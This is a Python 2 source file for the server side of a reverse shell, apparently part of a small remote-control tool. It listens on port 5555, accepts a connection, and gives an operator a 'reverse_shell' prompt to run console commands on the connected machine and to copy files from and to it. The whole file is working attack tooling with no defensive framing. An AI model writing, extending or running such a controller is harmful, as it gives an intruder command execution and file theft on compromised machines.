import socket
import json
import sys
import struct
import network as net
import files as files

PORT_NUM = 5555

COMMANDS = {'help':'print help',
            'cmd':'cmd [OPTION] OPTION - console command',
            'getfile':'getfile [FILEPATH] [LOCALPATH]- get file from remote',
            'sendfile':'sendfile [LOCALPATH] [REMOTEPATH]- send file to remote',
            'exit':'stop server',
           }

class Server(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        try:
            self.sock.listen(socket.SOMAXCONN)
            client, address = self.sock.accept()
            print 'recived connection from:',address
            self.consoleWithClient(client, address)
        except KeyboardInterrupt:
            raise
        except SystemExit:
            self.sock.close()
            raise
        except:
            self.listen()
    
    def consoleWithClient(self, client, address):
        command = 'initial'
        while command not in 'exit':
            command = raw_input('reverse_shell:{}>'.format(address))
            
            if 'help' in command:
                print json.dumps(COMMANDS, indent=4)
                continue

            if 'exit' in command:
                sys.exit()

            if 'cmd' in command:
                self.excuteRemoteCommand(client, address, command)
                continue
            
            splited_cmd = command.split(' ')
            if len(splited_cmd) < 3:
                print 'command is worng {}'.format(command)
                continue
            
            if 'sendfile' in command:
                data = files.getFileData(splited_cmd[1])
                if data == None:
                    print 'failed to get data from file'
                    continue
                
                net.sendAll(client,command)
                net.sendAll(client, data)

            if 'getfile' in command:
                net.sendAll(client,command)
                data = net.recvAll(client)
                if data in '':
                    print 'remote file failed'
                    continue
                files.createFileWithData(splited_cmd[2],data)
         

    def excuteRemoteCommand(self,client, address, command):
        splited_cmd = command.split(' ')
        if len(splited_cmd) < 2:
            return
        
        if splited_cmd[1] in 'cd':
            net.sendAll(client, command)
            return
        print 'xxxx'
        net.sendAll(client, command)
        print net.recvAll(client)
    
if __name__ == "__main__":
    Server('',PORT_NUM).listen()